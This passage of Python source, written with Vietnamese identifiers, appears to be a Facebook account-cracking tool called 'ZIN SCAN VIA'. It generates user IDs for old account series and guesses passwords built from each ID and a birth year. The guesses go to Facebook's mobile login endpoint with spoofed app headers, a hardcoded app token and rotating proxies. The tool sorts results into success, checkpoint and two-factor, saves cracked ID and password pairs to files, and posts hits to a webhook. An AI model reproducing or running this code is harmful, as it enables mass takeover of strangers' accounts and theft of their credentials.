        "desc": "ALL password (Base+VN+UID+Năm sinh)",
    },
}


def dem_mat_khau_mode(mode, sample_uid="100009123456789"):
    try:
        return len(ChienLuocMatKhau.tao_danh_sach(sample_uid, mode))
    except Exception:
        return 0


# ═══════════════════════════════════════════════════════════
# QUẢN LÝ PROXY
# ═══════════════════════════════════════════════════════════
class QuanLyProxy:
    GIAO_THUC = ("http://", "https://", "socks4://", "socks5://")

    def __init__(self, duong_dan_proxy):
        self.danh_sach = []
        self.da_chet   = set()
        self.vi_tri    = 0
        self._khoa     = None
        if CONFIG["enable_proxy"] and Path(duong_dan_proxy).is_file():
            try:
                with open(duong_dan_proxy, encoding="utf-8") as f:
                    for dong in f:
                        dong = dong.strip()
                        if not dong or dong.startswith("#"):
                            continue
                        if not dong.startswith(self.GIAO_THUC):
                            dong = "http://" + dong
                        self.danh_sach.append(dong)
            except OSError as e:
                sys.stderr.write(
                    f"[Quản Lý Proxy] Không đọc {duong_dan_proxy}: {e}\n")

    def _lay_khoa(self):
        if self._khoa is None:
            self._khoa = asyncio.Lock()
        return self._khoa

    async def lay_proxy(self):
        if not self.danh_sach:
            return None
        async with self._lay_khoa():
            if len(self.da_chet) >= len(self.danh_sach):
                self.da_chet.clear()
            for _ in range(len(self.danh_sach)):
                p = self.danh_sach[self.vi_tri % len(self.danh_sach)]
                self.vi_tri += 1
                if p not in self.da_chet:
                    return p
            self.da_chet.clear()
            p = self.danh_sach[self.vi_tri % len(self.danh_sach)]
            self.vi_tri += 1
            return p

    async def danh_dau_chet(self, proxy):
        if proxy:
            async with self._lay_khoa():
                self.da_chet.add(proxy)


# ═══════════════════════════════════════════════════════════
# THỐNG KÊ
# ═══════════════════════════════════════════════════════════
class ThongKe:
    def __init__(self):
        self.thoi_gian_bat_dau = time.time()
        self.da_thu        = 0
        self.thanh_cong    = 0
        self.chan          = 0
        self.hai_buoc      = 0
        self.loi_request   = 0
        self.loi_ghi_file  = 0
        self.loi_uid       = 0
        self.thu_lai       = 0
        self.uid_da_xu_ly  = 0
        self._vi_tri_xoay  = 0
        self._lan_cap_nhat = 0.0

    def thoi_gian_chay(self):
        return max(1e-6, time.time() - self.thoi_gian_bat_dau)

    def toc_do(self):
        return self.da_thu / self.thoi_gian_chay()

    def toc_do_uid(self):
        return self.uid_da_xu_ly / self.thoi_gian_chay()

    def tong_loi(self):
        return self.loi_request + self.loi_ghi_file + self.loi_uid

    def dong_trang_thai(self):
        self._vi_tri_xoay += 1
        lech = self._vi_tri_xoay

        xoay = SPINNER[self._vi_tri_xoay % len(SPINNER)]
        mau_xoay = RAINBOW[self._vi_tri_xoay % len(RAINBOW)]

        def mau(i):
            return RAINBOW[(i + lech) % len(RAINBOW)]

        return (
            f"  {mau_xoay}{xoay}{C.R} "
            f"{mau(0)}{C.B}OK:{self.thanh_cong}{C.R}"
            f" {C.GRAY}│{C.R} "
            f"{mau(1)}{C.B}CP:{self.chan}{C.R}"
            f" {C.GRAY}│{C.R} "
            f"{mau(2)}{C.B}2FA:{self.hai_buoc}{C.R}"
            f" {C.GRAY}│{C.R} "
            f"{mau(3)}{C.B}LỗiReq:{self.loi_request}{C.R}"
            f" {C.GRAY}│{C.R} "
            f"{mau(4)}{C.B}UID:{self.uid_da_xu_ly}{C.R}"
            f" {C.GRAY}│{C.R} "
            f"{mau(5)}{C.B}{self.toc_do():.0f}p/s{C.R}"
            f" {C.GRAY}│{C.R} "
            f"{mau(6)}{C.B}{self.toc_do_uid():.1f}u/s{C.R}"
        )


# ═══════════════════════════════════════════════════════════
# GHI FILE
# ═══════════════════════════════════════════════════════════
class QuanLyGhiFile:
    LOAI = ("thanhcong", "chan", "haibuoc")

    def __init__(self, thu_muc, nhan_series="series"):
        self.thu_muc = Path(thu_muc)
        try:
            self.thu_muc.mkdir(parents=True, exist_ok=True)
        except OSError as e:
            sys.stderr.write(
                f"[Ghi File] Không tạo được {thu_muc}: {e}\n"
                f"Dùng {_NHA}\n")
            self.thu_muc = _NHA
        self.thoi_gian = datetime.now().strftime("%Y%m%d_%H%M%S_%f")
        nhan_an_toan = re.sub(r'[^\w\-]', '_',
                               nhan_series.lower()).strip('_')
        self.nhan = nhan_an_toan or "series"
        self.tep = {}
        self._khoa = {}

    def _lay_khoa(self, f):
        if f not in self._khoa:
            self._khoa[f] = asyncio.Lock()
        return self._khoa[f]

    def _khoi_tao_tep(self):
        for loai in self.LOAI:
            self.tep[loai] = {
                "txt": self.thu_muc /
                       f"zin_{loai}_{self.nhan}_{self.thoi_gian}.txt",
            }

    def chuan_bi(self):
        self._khoi_tao_tep()

    async def luu(self, loai, uid, mat_khau, trang_thai="thanhcong",
                  proxy=""):
        nam = lay_nam_tai_khoan(uid)
        try:
            async with self._lay_khoa(self.tep[loai]["txt"]):
                async with aiofiles.open(self.tep[loai]["txt"], "a",
                                          encoding="utf-8") as f:
                    await f.write(f"{uid}|{mat_khau}|{nam}\n")
        except OSError as e:
            raise IOError(f"GhiFile.luu({loai}) thất bại: {e}")

    async def ket_thuc(self):
        return


# ═══════════════════════════════════════════════════════════
# QUẢN LÝ TRẠNG THÁI
# ═══════════════════════════════════════════════════════════
class QuanLyTrangThai:
    SO_UID_TOI_DA_NHO = 200_000

    def __init__(self, duong_dan):
        self.duong_dan = Path(duong_dan)
        self.du_lieu = {"uid_cuoi": None, "da_kiem_tra": [], "series": ""}
        if CONFIG["enable_resume"] and self.duong_dan.is_file():
            try:
                with open(self.duong_dan, encoding="utf-8") as f:
                    da_doc = json.load(f)
                    if isinstance(da_doc, dict):
                        self.du_lieu.update(da_doc)
            except (OSError, json.JSONDecodeError) as e:
                sys.stderr.write(
                    f"[Trạng Thái] Bỏ qua file lỗi: {e}\n")
        self.tap_da_kiem_tra = set(self.du_lieu.get("da_kiem_tra", []))
        self._khoa_luu = None

    def _lay_khoa(self):
        if self._khoa_luu is None:
            self._khoa_luu = asyncio.Lock()
        return self._khoa_luu

    def da_kiem_tra(self, uid):
        return uid in self.tap_da_kiem_tra

    async def danh_dau(self, uid):
        self.tap_da_kiem_tra.add(uid)
        if len(self.tap_da_kiem_tra) > self.SO_UID_TOI_DA_NHO:
            giu = list(self.tap_da_kiem_tra)[
                -int(self.SO_UID_TOI_DA_NHO * 0.75):]
            self.tap_da_kiem_tra = set(giu)
        self.du_lieu["da_kiem_tra"] = list(self.tap_da_kiem_tra)
        self.du_lieu["uid_cuoi"] = uid

    async def luu(self):
        async with self._lay_khoa():
            try:
                self.duong_dan.parent.mkdir(parents=True, exist_ok=True)
            except OSError:
                pass
            noi_dung = json.dumps(self.du_lieu, ensure_ascii=False,
                                    indent=2)
            tep_tam = self.duong_dan.with_name(
                self.duong_dan.name + ".tmp")
            try:
                async with aiofiles.open(tep_tam, "w",
                                          encoding="utf-8") as f:
                    await f.write(noi_dung)
                try:
                    tep_tam.replace(self.duong_dan)
                    return
                except OSError:
                    pass
            except OSError:
                pass
            try:
                async with aiofiles.open(self.duong_dan, "w",
                                          encoding="utf-8") as f:
                    await f.write(noi_dung)
                try:
                    if tep_tam.exists():
                        tep_tam.unlink()
                except OSError:
                    pass
            except OSError:
                pass


# ═══════════════════════════════════════════════════════════
# KIỂM TRA BẤT ĐỒNG BỘ
# ═══════════════════════════════════════════════════════════
DANH_SACH_UA = (
    'Dalvik/1.6.0 (Linux; U; Android 6.0.1; Nexus 6P Build/MMB29P) '
    '[FBAN/FB4A;FBAV/109.0.0.15.70;]',
    'Dalvik/2.1.0 (Linux; U; Android 11; SM-A125F Build/RP1A.200720.012) '
    '[FBAN/FB4A;FBAV/300.0.0.30.115;]',
    'Dalvik/2.1.0 (Linux; U; Android 12; Pixel 6 Build/SP1A.210812.016) '
    '[FBAN/FB4A;FBAV/350.0.0.32.105;]',
    'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 '
    'Chrome/120.0.0.0 Mobile',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
    'Chrome/120.0.0.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) '
    'AppleWebKit/605.1.15 Safari/605.1.15',
)

DIA_CHI_API = "https://b-graph.facebook.com/auth/login"


# ═══════════════════════════════════════════════════════════
# PHÂN LOẠI PHẢN HỒI FACEBOOK
# ═══════════════════════════════════════════════════════════
TRANG_THAI_OK         = "success"
TRANG_THAI_CHECKPOINT = "checkpoint"
TRANG_THAI_2FA        = "2fa"
TRANG_THAI_SAI_MK     = "wrong_pass"
TRANG_THAI_KHAC       = "unknown"


def phan_loai_phan_hoi(phan_hoi):
    if not isinstance(phan_hoi, dict):
        return TRANG_THAI_KHAC

    if 'access_token' in phan_hoi:
        return TRANG_THAI_OK

    loi_obj = phan_hoi.get('error')
    if not isinstance(loi_obj, dict):
        return TRANG_THAI_KHAC

    ma_loi  = loi_obj.get('code', 0) or 0
    subcode = loi_obj.get('error_subcode', 0) or 0
    thong_bao = str(loi_obj.get('message', '')).lower()
    loai_loi  = str(loi_obj.get('type', '')).lower()

    if ma_loi == 401 or subcode == 1348131:
        return TRANG_THAI_CHECKPOINT
    if 'www.facebook.com' in thong_bao:
        return TRANG_THAI_CHECKPOINT
    if 'checkpoint' in thong_bao or 'confirm your identity' in thong_bao:
        return TRANG_THAI_CHECKPOINT
    if 'disabled' in thong_bao or 'banned' in thong_bao:
        return TRANG_THAI_CHECKPOINT
    if 'suspended' in thong_bao:
        return TRANG_THAI_CHECKPOINT
    if loai_loi == 'oauthexception' and 'user_checkpointed' in thong_bao:
        return TRANG_THAI_CHECKPOINT

    if ma_loi == 404829:
        return TRANG_THAI_2FA
    if subcode in (1348162, 1348163):
        return TRANG_THAI_2FA
    if 'two-factor' in thong_bao or 'two_factor' in thong_bao:
        return TRANG_THAI_2FA
    if 'two factor' in thong_bao:
        return TRANG_THAI_2FA
    if 'login approval' in thong_bao:
        return TRANG_THAI_2FA
    if 'approvals_code' in thong_bao:
        return TRANG_THAI_2FA

    return TRANG_THAI_SAI_MK


class BoKiemTra:
    def __init__(self, quan_ly_proxy, thong_ke, ghi_file, trang_thai,
                 mode="supreme"):
        self.quan_ly_proxy = quan_ly_proxy
        self.thong_ke      = thong_ke
        self.ghi_file      = ghi_file
        self.trang_thai    = trang_thai
        self.mode          = mode
        self.gioi_han      = asyncio.Semaphore(CONFIG["concurrency"])
        self._khoa_toc_do  = None
        self.lan_yeu_cau_cuoi = 0.0
        self.client        = None
        self.tac_vu_webhook = set()

    def _lay_khoa_toc_do(self):
        if self._khoa_toc_do is None:
            self._khoa_toc_do = asyncio.Lock()
        return self._khoa_toc_do

    async def __aenter__(self):
        gioi_han_ket_noi = httpx.Limits(
            max_connections=CONFIG["concurrency"] + 50,
            max_keepalive_connections=CONFIG["concurrency"],
        )
        self.client = httpx.AsyncClient(
            timeout=CONFIG["timeout"],
            limits=gioi_han_ket_noi,
            verify=CONFIG["verify_tls"],
            follow_redirects=True,
            http2=False,
        )
        return self

    async def __aexit__(self, *args):
        for t in list(self.tac_vu_webhook):
            if not t.done():
                t.cancel()
        if self.tac_vu_webhook:
            await asyncio.gather(*self.tac_vu_webhook,
                                  return_exceptions=True)
        if self.client:
            try:
                await self.client.aclose()
            except Exception:
                pass

    async def _gioi_han_toc_do(self):
        if CONFIG["rate_limit"] <= 0:
            return
        async with self._lay_khoa_toc_do():
            hien_tai = time.time()
            khoang_toi_thieu = 1.0 / CONFIG["rate_limit"]
            khoang_cach = hien_tai - self.lan_yeu_cau_cuoi
            if khoang_cach < khoang_toi_thieu:
                await asyncio.sleep(khoang_toi_thieu - khoang_cach)
            self.lan_yeu_cau_cuoi = time.time()

    def _tao_yeu_cau(self, uid, mat_khau):
        du_lieu = {
            'adid': str(uuid.uuid4()),
            'email': uid,
            'password': mat_khau,
            'cpl': 'true',
            'credentials_type': 'device_based_login_password',
            'source': 'device_based_login',
            'error_detail_type': 'button_with_disabled',
            'format': 'json',
            'generate_session_cookies': '1',
            'generate_analytics_claim': '1',
            'generate_machine_id': '1',
            'family_device_id': str(uuid.uuid4()),
            'advertiser_id': str(uuid.uuid4()),
            'locale': 'en_US',
            'client_country_code': 'US',
            'device_id': str(uuid.uuid4()),
            'method': 'auth.login',
            'api_key': '882a8490361da98702bf97a021ddc14d',
            'fb_api_req_friendly_name': 'authenticate',
            'fb_api_caller_class':
                'com.facebook.account.login.protocol.Fb4aAuthHandler',
        }
        tieu_de = {
            'content-type': 'application/x-www-form-urlencoded',
            'Host': 'graph.facebook.com',
            'x-fb-sim-hni': str(random.randint(20000, 40000)),
            'X-FB-Connection-Type': 'MOBILE.LTE',
            'Authorization':
                'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'user-agent': random.choice(DANH_SACH_UA),
            'x-fb-net-hni': str(random.randint(20000, 40000)),
            'x-fb-device-group': '5120',
            'x-fb-session-id':
                'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid='
                + uuid.uuid4().hex,
            'x-fb-connection-bandwidth':
                str(random.randint(20000000, 30000000)),
            'X-FB-Server-Cluster': 'True',
            'x-fb-connection-token': uuid.uuid4().hex,
            'x-fb-friendly-name': 'ViewerReactionsMutation',
            'accept-encoding': 'gzip, deflate',
            'x-fb-http-engine': 'Liger',
        }
        return du_lieu, tieu_de

    def _tuy_chon_proxy(self, proxy):
        if not proxy:
            return {}
        if _HTTPX_PROXY_MOI:
            return {"proxy": proxy}
        return {"proxies": {"all://": proxy}}

    async def _mot_yeu_cau(self, uid, mat_khau, proxy=None):
        if CONFIG["dry_run"]:
            return {"_dry_run": True}, None
        du_lieu, tieu_de = self._tao_yeu_cau(uid, mat_khau)
        try:
            phan_hoi = await self.client.post(
                DIA_CHI_API, data=du_lieu, headers=tieu_de,
                **self._tuy_chon_proxy(proxy),
            )
            if phan_hoi.status_code >= 500:
                return None, f"http_{phan_hoi.status_code}"
            if phan_hoi.status_code == 429:
                return None, "http_429"
            try:
                return phan_hoi.json(), None
            except ValueError:
                return None, "invalid_json"
        except httpx.TimeoutException:
            return None, "timeout"
        except httpx.ProxyError:
            return None, "proxy_dead"
        except httpx.ConnectError:
            return None, "connect_error"
        except httpx.HTTPError as e:
            return None, f"http_{type(e).__name__}"
        except Exception as e:
            return None, f"err_{type(e).__name__}"

    async def _yeu_cau_co_thu_lai(self, uid, mat_khau, proxy=None):
        loi_cuoi = None
        for lan in range(CONFIG["max_retries"]):
            if lan > 0:
                self.thong_ke.thu_lai += 1
            phan_hoi, loi = await self._mot_yeu_cau(uid, mat_khau, proxy)
            if phan_hoi is not None:
                return phan_hoi, None, proxy
            loi_cuoi = loi
            if loi == "proxy_dead" and proxy:
                await self.quan_ly_proxy.danh_dau_chet(proxy)
                proxy = await self.quan_ly_proxy.lay_proxy()
            if loi in ("http_429", "http_503", "timeout"):
                cho = CONFIG["retry_backoff"] ** lan + random.uniform(0, 0.5)
                await asyncio.sleep(cho)
            else:
                break
        return None, loi_cuoi, proxy

    async def kiem_tra_tai_khoan(self, uid):
        try:
            await self._kiem_tra_noi_bo(uid)
        except asyncio.CancelledError:
            raise
        except IOError as e:
            self.thong_ke.loi_ghi_file += 1
            sys.stderr.write(
                f"[Kiểm Tra] LỖI GHI FILE uid={uid}: {e}\n")
        except Exception as e:
            self.thong_ke.loi_uid += 1
            sys.stderr.write(
                f"[Kiểm Tra] LỖI uid={uid}: "
                f"{type(e).__name__}: {e}\n")
        finally:
            self.thong_ke.uid_da_xu_ly += 1

    async def _kiem_tra_noi_bo(self, uid):
        if self.trang_thai.da_kiem_tra(uid):
            return

        await self.trang_thai.danh_dau(uid)

        danh_sach = ChienLuocMatKhau.tao_danh_sach(uid, self.mode)
        proxy = await self.quan_ly_proxy.lay_proxy()

        for mat_khau in danh_sach:
            if _STOP_EVENT is not None and _STOP_EVENT.is_set():
                return
            async with self.gioi_han:
                await self._gioi_han_toc_do()
                phan_hoi, loi, proxy = await self._yeu_cau_co_thu_lai(
                    uid, mat_khau, proxy)

            self.thong_ke.da_thu += 1
            self._ve_trang_thai()

            if phan_hoi is None:
                self.thong_ke.loi_request += 1
                continue

            if CONFIG["dry_run"]:
                self._ve_thanh_cong(uid, mat_khau, proxy)
                await self.ghi_file.luu("thanhcong", uid, mat_khau,
                                         "thanhcong", proxy)
                self.thong_ke.thanh_cong += 1
                break

            trang_thai = phan_loai_phan_hoi(phan_hoi)

            if trang_thai == TRANG_THAI_OK:
                self._ve_thanh_cong(uid, mat_khau, proxy)
                await self.ghi_file.luu("thanhcong", uid, mat_khau,
                                         "thanhcong", proxy)
                self.thong_ke.thanh_cong += 1
                await self._bao_webhook("THÀNH CÔNG", uid, mat_khau,
                                         proxy)
                break

            if trang_thai == TRANG_THAI_CHECKPOINT:
                self._ve_chan(uid, mat_khau, proxy)
                await self.ghi_file.luu("chan", uid, mat_khau,
                                         "chan", proxy)
                self.thong_ke.chan += 1
                await self._bao_webhook("CHẶN", uid, mat_khau, proxy)
                break

            if trang_thai == TRANG_THAI_2FA:
                self._ve_hai_buoc(uid, mat_khau, proxy)
                await self.ghi_file.luu("haibuoc", uid, mat_khau,
                                         "haibuoc", proxy)
                self.thong_ke.hai_buoc += 1
                await self._bao_webhook("HAI BƯỚC", uid, mat_khau,
                                         proxy)
                break

        if (self.thong_ke.uid_da_xu_ly % 50) == 0:
            await self.trang_thai.luu()

    def _ve_trang_thai(self):
        hien_tai = time.time()
        if hien_tai - self.thong_ke._lan_cap_nhat < 0.1:
            return
        self.thong_ke._lan_cap_nhat = hien_tai

        chuoi = self.thong_ke.dong_trang_thai()
        rong = _rong_terminal()
        chuoi = _cat_theo_rong(chuoi, max(20, rong - 1))

        try:
            with _STDOUT_KHOA:
                sys.stdout.write("\r\033[2K" + chuoi)
                sys.stdout.flush()
        except OSError:
            pass

    def _hop(self, mau, tieu_de, uid, mat_khau, proxy):
        vien = "═" * 40
        dong = [
            f"  {mau}{C.B}╔{vien}╗{C.R}",
            f"  {mau}{C.B}║{C.R} {mau_cau_vong(tieu_de)}",
            f"  {mau}{C.B}║{C.R} {C.CYAN}UID  :{C.R} "
            f"{C.WHITE}{C.B}{uid}{C.R}",
            f"  {mau}{C.B}║{C.R} {C.YELLOW}MẬT KHẨU:{C.R} "
            f"{C.WHITE}{C.B}{mat_khau}{C.R}",
        ]
        if proxy:
            dong.append(
                f"  {mau}{C.B}║{C.R} {C.GRAY}PROXY:{C.R} "
                f"{C.WHITE}{proxy}{C.R}")
        dong.append(f"  {mau}{C.B}╚{vien}╝{C.R}")
        try:
            with _STDOUT_KHOA:
                sys.stdout.write("\r\033[2K")
                sys.stdout.write("\n".join(dong) + "\n")
                sys.stdout.flush()
        except OSError:
            pass
        tieng_keo()

    def _ve_thanh_cong(self, uid, mat_khau, proxy):
        if _HOAT_HINH_OK:
            nhap_nhay("✨ THÀNH CÔNG ✨", mau=C.GREEN,
                       so_lan=2, do_tre=0.12, le="  ")
        self._hop(C.GREEN, "✨ THÀNH CÔNG ✨", uid, mat_khau, proxy)

    def _ve_chan(self, uid, mat_khau, proxy):
        if _HOAT_HINH_OK:
            nhap_nhay("◐ BỊ CHẶN ◐", mau=C.GOLD,
                       so_lan=2, do_tre=0.12, le="  ")
        self._hop(C.GOLD, "◐ BỊ CHẶN ◐", uid, mat_khau, proxy)

    def _ve_hai_buoc(self, uid, mat_khau, proxy):
        if _HOAT_HINH_OK:
            nhap_nhay("🔐 XÁC MINH 2 BƯỚC 🔐", mau=C.PINK,
                       so_lan=2, do_tre=0.12, le="  ")
        self._hop(C.PINK, "🔐 XÁC MINH 2 BƯỚC", uid, mat_khau, proxy)

    async def _bao_webhook(self, trang_thai, uid, mat_khau, proxy):
        if not CONFIG["notify_webhook"] or not self.client:
            return
        noi_dung = {
            "content": f"**[{trang_thai}]** Trúng!\n"
                       f"UID: `{uid}`\nMật khẩu: `{mat_khau}`\n"
                       f"Proxy: `{proxy or 'không'}`"
        }
        t = asyncio.create_task(self._gui_webhook_an_toan(noi_dung))
        self.tac_vu_webhook.add(t)
        t.add_done_callback(self.tac_vu_webhook.discard)

    async def _gui_webhook_an_toan(self, noi_dung):
        try:
            await asyncio.wait_for(
                self.client.post(CONFIG["notify_webhook"],
                                  json=noi_dung),
                timeout=CONFIG["webhook_timeout"],
            )
        except (httpx.HTTPError, asyncio.TimeoutError,
                asyncio.CancelledError):
            pass
        except Exception:
            pass


# ═══════════════════════════════════════════════════════════
# TÍN HIỆU DỪNG
# ═══════════════════════════════════════════════════════════
_STOP_EVENT = None


def cai_dat_tin_hieu(vong_lap, su_kien_dung):
    def _xu_ly():
        su_kien_dung.set()
    for tin_hieu in (signal.SIGINT, signal.SIGTERM):
        try:
            vong_lap.add_signal_handler(tin_hieu, _xu_ly)
        except (NotImplementedError, RuntimeError, ValueError):
            pass


# ═══════════════════════════════════════════════════════════
# ỨNG DỤNG CHÍNH
# ═══════════════════════════════════════════════════════════
class UngDungZin:
    MENU = (
        ("1", "2011-2012", C.PINK,    "🌸"),
        ("2", "2010",      C.CRIMSON, "🔥"),
        ("3", "2009",      C.ORANGE,  "🍊"),
        ("4", "2008",      C.GOLD,    "🌟"),
        ("5", "2007",      C.LIME,    "🍀"),
        ("6", "2005-2006", C.AQUA,    "💎"),
        ("7", "NGẪU NHIÊN", C.VIOLET, "🎲"),
        ("0", "THOÁT",     C.GRAY,    "🚪"),
    )

    def chay(self):
        in_logo_vo_han()
        print(f"  {C.VIOLET}{C.B}[ CHỌN PHƯƠNG PHÁP ]{C.R}")
        vach_ngan()
        for so, ten, mau, bieu_tuong in self.MENU:
            if ten == "THOÁT":
                print(f"  {mau}{C.B}[{C.WHITE}{so}{mau}]{C.R} "
                      f"{bieu_tuong}  {C.B}{ten}{C.R}")
            elif ten == "NGẪU NHIÊN":
                print(f"  {mau}{C.B}[{C.WHITE}{so}{mau}]{C.R} "
                      f"{bieu_tuong}  "
                      f"{mau_cau_vong('NGẪU NHIÊN (Mọi Series)',
                                      palette=RAINBOW3)}")
            else:
                print(f"  {mau}{C.B}[{C.WHITE}{so}{mau}]{C.R} "
                      f"{bieu_tuong}  {C.B}{ten}{C.R} METHOD")
        vach_ngan()
        print(f"  {mau_cau_vong('⚡ ZIN SCAN VIA - SUPREME AUTHOR')}")
        print()
        try:
            chon = input(f"  {C.CYAN}{C.B}➤ Chọn: {C.R}").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            sys.exit(0)

        if chon == "0":
            self.tam_biet()
        if chon not in SERIES_MAP:
            print(f"  {C.RED}✗ Lựa chọn không hợp lệ{C.R}")
            time.sleep(1)
            self.chay()
            return

        ten, tien_to, do_dai = SERIES_MAP[chon]
        self.chay_kiem_tra(ten, tien_to, do_dai)

    def tam_biet(self):
        in_logo(hoat_hinh=False)
        print()
        hop_can_giua("HẸN GẶP LẠI")
        print()
        print("  " + vien_cau_vong("✦", palette=RAINBOW2))
        print()
        hieu_ung_song("✦ Cảm ơn đã sử dụng ZIN ✦",
                       palette=RAINBOW3,
                       thoi_gian=1.0,
                       do_tre=0.05)
        print()
        sys.exit(0)

    def _hien_thi_scan_modes(self):
        print(f"  {C.VIOLET}{C.B}[ CHỌN TỐC ĐỘ SCAN ]{C.R}")
        vach_ngan()
        for khoa, cfg in SCAN_MODES.items():
            mau = cfg["color"]
            so_mk = dem_mat_khau_mode(cfg["password_mode"])
            w_min = cfg["min_workers"]
            w_max = cfg["max_workers"]
            w_def = cfg["default_workers"]
            print(
                f"  {mau}{C.B}[{C.WHITE}{khoa}{mau}]{C.R} "
                f"{cfg['icon']} {mau}{C.B}{cfg['name']}{C.R}"
            )
            print(f"       {C.GRAY}▸ {cfg['desc']}{C.R}")
            print(
                f"       {C.GRAY}▸ Mật khẩu: {C.WHITE}{C.B}{so_mk}{C.R}"
                f" {C.GRAY}| Workers: {C.WHITE}{C.B}{w_min}-{w_max}"
                f"{C.R} {C.GRAY}(mặc định {w_def}){C.R}"
            )
        vach_ngan()

    def _chon_scan_mode(self):
        while True:
            self._hien_thi_scan_modes()
            try:
                chon = input(
                    f"  {C.CYAN}{C.B}➤ Chọn tốc độ (1-4) "
                    f"hoặc 0 để quay lại: {C.R}"
                ).strip()
            except (EOFError, KeyboardInterrupt):
                print()
                return None

            if chon == "0":
                return None
            if chon not in SCAN_MODES:
                print(f"  {C.RED}✗ Lựa chọn không hợp lệ{C.R}")
                time.sleep(1)
                continue

            cfg = SCAN_MODES[chon]
            workers = self._chon_workers(cfg)
            if workers is None:
                continue
            return cfg, workers

    def _chon_workers(self, cfg):
        w_min = cfg["min_workers"]
        w_max = cfg["max_workers"]
        w_def = cfg["default_workers"]
        print()
        print(
            f"  {cfg['color']}{C.B}Workers [{w_min} - {w_max}]{C.R} "
            f"{C.GRAY}(Enter = {w_def}){C.R}"
        )
        try:
            nhap = input(
                f"  {C.CYAN}{C.B}➤ Số workers: {C.R}"
            ).strip()
        except (EOFError, KeyboardInterrupt):
            print()
            return None

        if nhap == "":
            return w_def
        try:
            w = int(nhap)
        except (ValueError, TypeError):
            print(f"  {C.RED}✗ Không phải số{C.R}")
            time.sleep(1)
            return self._chon_workers(cfg)

        if not (w_min <= w <= w_max):
            print(
                f"  {C.RED}✗ Phải trong khoảng "
                f"{w_min}-{w_max}{C.R}"
            )
            time.sleep(1)
            return self._chon_workers(cfg)
        return w

    def chay_kiem_tra(self, ten, tien_to, do_dai):
        in_logo(hoat_hinh=False)
        print(f"  {C.YELLOW}{C.B}📋 SERIES: {C.WHITE}{ten}{C.R}")
        vach_ngan()

        la_ngau_nhien = (tien_to == "NGẪU NHIÊN")
        if la_ngau_nhien:
            print(f"  {mau_cau_vong('🎲 Ngẫu nhiên mọi series (2005-2012)',
                                  palette=RAINBOW3)}")
        else:
            print(f"  {C.CYAN}Độ dài thân: "
                  f"{C.WHITE}{C.B}{do_dai}{C.R} chữ số")
        vach_ngan()
        print()

        ket_qua = self._chon_scan_mode()
        if ket_qua is None:
            self.chay()
            return
        cfg, workers = ket_qua
        mode = cfg["password_mode"]

        in_logo(hoat_hinh=False)
        print(f"  {C.YELLOW}{C.B}📋 SERIES: {C.WHITE}{ten}{C.R}")
        print(f"  {cfg['color']}{C.B}{cfg['icon']} "
              f"{cfg['name']}{C.R} {C.GRAY}▸ "
              f"{cfg['desc']}{C.R}")
        print(f"  {C.CYAN}Workers  : {C.WHITE}{C.B}{workers}{C.R} "
              f"{C.GRAY}| Mật khẩu: {C.WHITE}{C.B}"
              f"{dem_mat_khau_mode(mode)}{C.R}")
        vach_ngan()
        print(f"  {C.GRAY}Ví dụ: 1000, 5000, 10000, 200000{C.R}")

        try:
            nhap = input(f"  {C.CYAN}{C.B}➤ Số lượng UID: {C.R}").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            sys.exit(0)

        try:
            so_luong = int(nhap)
        except (ValueError, TypeError):
            print(f"  {C.RED}✗ Không phải số hợp lệ{C.R}")
            time.sleep(1)
            self.chay_kiem_tra(ten, tien_to, do_dai)
            return

        if so_luong <= 0:
            print(f"  {C.RED}✗ Số lượng phải lớn hơn 0{C.R}")
            time.sleep(1)
            self.chay_kiem_tra(ten, tien_to, do_dai)
            return
        if so_luong > CONFIG["max_limit"]:
            print(f"  {C.RED}✗ Vượt giới hạn "
                  f"({CONFIG['max_limit']}){C.R}")
            time.sleep(1)
            self.chay_kiem_tra(ten, tien_to, do_dai)
            return

        try:
            asyncio.run(self._chay_bat_dong_bo(
                ten, tien_to, do_dai, so_luong, mode, workers, cfg))
        except KeyboardInterrupt:
            print(f"\n  {C.RED}⏹ Dừng bởi người dùng{C.R}")

    async def _chay_bat_dong_bo(self, ten, tien_to, do_dai, so_luong,
                                  mode, workers, cfg):
        global _STOP_EVENT
        _STOP_EVENT = asyncio.Event()
        vong_lap = asyncio.get_running_loop()
        cai_dat_tin_hieu(vong_lap, _STOP_EVENT)

        CONFIG["concurrency"] = workers
        CONFIG["queue_maxsize"] = max(400, workers * 4)

        quan_ly_proxy = QuanLyProxy(CONFIG["proxy_file"])
        thong_ke      = ThongKe()

        tieu_de_dong = TieuDeDong()
        tieu_de_dong.bat_dau(thong_ke)

        la_ngau_nhien = (tien_to == "NGẪU NHIÊN")
        nhan_series = "ngaunhien" if la_ngau_nhien else ten

        ghi_file = QuanLyGhiFile(CONFIG["output_dir"],
                                   nhan_series=nhan_series)
        ghi_file.chuan_bi()

        trang_thai = QuanLyTrangThai(CONFIG["state_file"])
        trang_thai.du_lieu["series"] = ten

        bo_sinh = BoSinhUID(
            prefixes=tien_to if not la_ngau_nhien else (),
            do_dai_than=do_dai,
            la_ngau_nhien=la_ngau_nhien,
        )

        so_mk = dem_mat_khau_mode(mode)

        in_logo(hoat_hinh=False)
        print(f"  {C.GREEN}{C.B}[ ✓ ]{C.R} TỔNG UID     "
              f"{C.GRAY}▸{C.R} {C.WHITE}{C.B}{so_luong}{C.R}")
        print(f"  {C.GREEN}{C.B}[ ✓ ]{C.R} SERIES       "
              f"{C.GRAY}▸{C.R} {C.WHITE}{C.B}{ten}{C.R}")
        print(f"  {cfg['color']}{C.B}[ ✓ ]{C.R} MODE         "
              f"{C.GRAY}▸{C.R} {cfg['color']}{C.B}"
              f"{cfg['icon']} {cfg['name']}{C.R}")
        print(f"  {C.GREEN}{C.B}[ ✓ ]{C.R} WORKERS      "
              f"{C.GRAY}▸{C.R} {C.WHITE}{C.B}{workers}{C.R}")
        print(f"  {C.GREEN}{C.B}[ ✓ ]{C.R} MẬT KHẨU/UID "
              f"{C.GRAY}▸{C.R} {C.WHITE}{C.B}{so_mk}{C.R}")
        print(f"  {C.GREEN}{C.B}[ ✓ ]{C.R} TIMEOUT      "
